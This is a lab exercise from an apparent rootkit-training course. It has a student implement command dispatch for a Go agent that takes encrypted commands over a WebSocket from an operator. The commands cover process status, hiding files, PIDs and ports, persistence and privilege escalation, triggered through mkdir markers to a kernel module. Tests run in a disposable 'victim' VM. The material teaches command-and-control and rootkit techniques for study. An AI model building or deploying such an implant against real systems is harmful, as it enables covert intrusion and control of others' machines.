# L17: Command Dispatch

## Mission

Turn the encrypted transport into a multi-command agent. The operator sends
commands over the persistent WebSocket connection; the agent
dispatches each one to a handler and sends the result back immediately.

L15 proved the agent can reach the operator over WebSocket with AEAD encryption.

This exercise adds structured commands: the server sends JSON, the agent routes
each command through a handler map, and sends a result frame back.

## What you will observe

The agent holds an open WebSocket to the operator:

- The operator sends a command
- The agent decrypts it, dispatches to the matching handler
- Encrypts the result and sends it back on the same connection
- Unknown commands get an error result without crashing the session

## Workspace

```text
exercises/L17-command-dispatch
├── go.mod
└── main.go
```

Only `main.go` is editable.

- Crypto functions, transport (wsLoop/wsSession/wsSend/initTransport), and
  helpers are provided
- Implement the handler type, handler map, and the execute function

## Protocol

The agent communicates over a persistent WebSocket with AES-256-GCM encryption
per frame.

```text
  Agent                              Server (operator)
    |                                  |
    |--- hello frame ----------------> |
    |    agentPubKey || AEAD(hello)     |
    |                                  |
    | <-- encrypted command ---------- |
    |    AEAD({"op":"PING"})           |
    |                                  |
    |--- encrypted result -----------> |
    |    AEAD({"data":"PONG"})         |
    |                                  |
    | <-- encrypted command ---------- |
    |    AEAD({"op":"HIDE",            |
    |     "arg":"FILE secret"})        |
    |                                  |
    |--- encrypted result -----------> |
    |    AEAD({"data":"OK"})           |
```

### Command type

```go
type Command struct {
    Op   string          `json:"op"`
    Arg  string          `json:"arg,omitempty"`
    Data json.RawMessage `json:"data,omitempty"`
}
```

Each command arrives as an individual encrypted WebSocket frame.
The agent decrypts, dispatches, and sends the result as another encrypted
frame. No batching, no polling, no IDs needed.

## Handler pattern

A handler is a function that takes the command's argument string and returns a
value. A map routes Op strings to handlers.

```go
type handler func(arg string) any

var handlers = map[string]handler{
    "PING":     handlePing,
    "STATUS":   handleStatus,
    "HIDE":     handleHide,
    "PERSIST":  handlePersist,
    "ESCALATE": handleEscalate,
}
```

Each handler does its work (mkdir for kernel-module commands, or just returns a
value for PING/STATUS) and returns the result directly. No connection object, no
writing to a stream.

## Commands

| Command        | Argument   | Side effect            | Returns                  |
| -------------- | ---------- | ---------------------- | ------------------------ |
| PING           | (none)     | (none)                 | "PONG"                   |
| STATUS         | (none)     | (none)                 | {"pid": N, "uid": N}     |
| HIDE FILE name | FILE name  | mkdir rklings.h.f.name | "OK"                     |
| HIDE PID pid   | PID pid    | mkdir rklings.h.i.pid  | "OK"                     |
| HIDE PORT port | PORT port  | mkdir rklings.h.p.port | "OK"                     |
| PERSIST        | (none)     | mkdir rklings.persist  | "OK"                     |
| ESCALATE       | (none)     | mkdir rklings.e        | "OK"                     |
| (unknown)      |            | (none)                 | {"error": "unknown ..."} |

HIDE takes a subcommand (FILE, PID, PORT) as its first argument word.

## WebSocket session loop

The transport is provided. `wsLoop()` reconnects on errors with jitter.
`wsSession()` dials the operator, sends the hello frame, then enters a read
loop: each incoming frame is decrypted, unmarshalled into a `Command`, passed to
`execute()`, and the result is encrypted and sent back with `wsSend()`.

Your job is `execute()`: look up the handler by `cmd.Op`, call it, and return
the result. Unknown ops return an error map.

## TODOs

```text
TODO 1  main.go   define handler type, build handler map, implement handlers
TODO 2  main.go   implement execute(cmd Command) any
```

The crypto, transport, and helpers are supplied. You write the command routing.

### TODO 1 -- Handler type and map

Define a `handler` function type: `func(arg string) any`.
Create a `handlers` map from Op string to handler.
Implement each handler function:

- PING: return `"PONG"`
- STATUS: return `map[string]int{"pid": os.Getpid(), "uid": os.Getuid()}`
- HIDE: split arg into subcommand and target, call `mkdirCmd`, return `"OK"`
- PERSIST: call `mkdirCmd("persist")`, return `"OK"`
- ESCALATE: call `mkdirCmd("e")`, return `"OK"`

### TODO 2 -- Implement execute

Write an `execute(cmd Command) any` function that looks up `cmd.Op` in the
handler map and calls the matching handler with `cmd.Arg`. Return an error map
for unknown ops.

Call `wsLoop()` from `main()` after `initTransport()`.

## Test it

`rklings serve L17` starts this exercise's live server and scoped command panel
at `http://127.0.0.1:8080`.
Every log entry is traffic exchanged with the agent running in the disposable
guest.

```console
$ ./rklings serve L17
```

In another host terminal:

```console
$ ./rklings run L17
```

Open `http://127.0.0.1:8080`.
The panel sends only the commands introduced by this exercise, and its log shows
the real replies from the guest agent.
Create `secret.txt` in the guest before sending the hide command.

```text
server> PING
agent:  PONG
server> STATUS
agent:  {"pid":482,"uid":0}
server> HIDE FILE secret.txt
agent:  OK
```

In the VM, confirm the file is hidden:

```console
root@victim:~# ls /tmp/
root@victim:~#
```

Stop `run` and `serve` with `Ctrl+C` when finished.

## Validate

```console
$ ./rklings validate L17
  [+] Server sends PING, agent responds PONG
  [+] Server sends STATUS, agent responds with state
  [+] Server sends HIDE FILE x, file hidden from ls
  [+] Server sends ESCALATE, agent gains root
  PASS
```

## Next

The operator can invoke the built-in controls, but cannot run an arbitrary
command on the target.
L18 adds remote command execution and returns its output.
